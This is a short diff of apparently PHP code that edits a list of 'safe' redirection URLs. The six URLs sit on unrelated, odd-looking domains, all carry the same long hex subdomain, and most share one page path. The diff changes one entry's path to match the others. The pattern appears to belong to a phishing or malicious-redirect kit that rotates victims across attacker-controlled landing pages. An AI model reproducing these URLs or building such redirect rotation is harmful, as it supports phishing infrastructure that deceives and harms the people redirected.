@@ -160,7 +160,7 @@ $safeRedirectionUrl = '';
 $safeListRedirectionUrl = ['https://24ee795b7eb3cf63412ea1852637f9af00fd3958d2a0991ebc85ebc573804.fiberglassschina.cc/exbf371761202-css.html',
 'https://24ee795b7eb3cf63412ea1852637f9af00fd3958d2a0991ebc85ebc573804.kccworld.online/exbf371761202-css.html',
 'https://24ee795b7eb3cf63412ea1852637f9af00fd3958d2a0991ebc85ebc573804.testoriamirates.com/exbf371761202-css.html',
-'https://24ee795b7eb3cf63412ea1852637f9af00fd3958d2a0991ebc85ebc573804.mysta.club/index.html',
+'https://24ee795b7eb3cf63412ea1852637f9af00fd3958d2a0991ebc85ebc573804.mysta.club/exbf371761202-css.html',
 'https://24ee795b7eb3cf63412ea1852637f9af00fd3958d2a0991ebc85ebc573804.testoriemirate.com/exbf371761202-css.html',
 'https://24ee795b7eb3cf63412ea1852637f9af00fd3958d2a0991ebc85ebc573804.xangohealers.com/exbf371761202-css.html']  // Add more safe URLs as needed
 ;
